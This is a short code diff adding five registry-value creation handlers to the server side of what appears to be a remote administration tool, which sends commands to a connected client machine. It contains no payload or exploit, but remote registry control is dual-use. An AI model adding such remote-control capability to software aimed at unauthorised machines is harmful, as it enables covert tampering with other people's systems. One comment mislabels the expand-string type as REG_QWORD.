@@ -488,6 +488,51 @@ namespace xServer.Forms
             }
         }
 
+        private void createBinaryRegistryValue_Click(object sender, EventArgs e)
+        {
+            if (tvRegistryDirectory.SelectedNode != null)
+            {
+                //Request the creation of a new Registry value of type REG_BINARY
+                new xServer.Core.Packets.ServerPackets.DoCreateRegistryValue(tvRegistryDirectory.SelectedNode.FullPath, RegistryValueKind.Binary).Execute(_connectClient);
+            }
+        }
+
+        private void createDwordRegistryValue_Click(object sender, EventArgs e)
+        {
+            if (tvRegistryDirectory.SelectedNode != null)
+            {
+                //Request the creation of a new Registry value of type REG_DWORD
+                new xServer.Core.Packets.ServerPackets.DoCreateRegistryValue(tvRegistryDirectory.SelectedNode.FullPath, RegistryValueKind.DWord).Execute(_connectClient);
+            }
+        }
+
+        private void createQwordRegistryValue_Click(object sender, EventArgs e)
+        {
+            if (tvRegistryDirectory.SelectedNode != null)
+            {
+                //Request the creation of a new Registry value of type REG_QWORD
+                new xServer.Core.Packets.ServerPackets.DoCreateRegistryValue(tvRegistryDirectory.SelectedNode.FullPath, RegistryValueKind.QWord).Execute(_connectClient);
+            }
+        }
+
+        private void createMultiStringRegistryValue_Click(object sender, EventArgs e)
+        {
+            if (tvRegistryDirectory.SelectedNode != null)
+            {
+                //Request the creation of a new Registry value of type REG_MULTI_SZ
+                new xServer.Core.Packets.ServerPackets.DoCreateRegistryValue(tvRegistryDirectory.SelectedNode.FullPath, RegistryValueKind.MultiString).Execute(_connectClient);
+            }
+        }
+
+        private void createExpandStringRegistryValue_Click(object sender, EventArgs e)
+        {
+            if (tvRegistryDirectory.SelectedNode != null)
+            {
+                //Request the creation of a new Registry value of type REG_QWORD
+                new xServer.Core.Packets.ServerPackets.DoCreateRegistryValue(tvRegistryDirectory.SelectedNode.FullPath, RegistryValueKind.ExpandString).Execute(_connectClient);
+            }
+        }
+
         #endregion
 
         #endregion
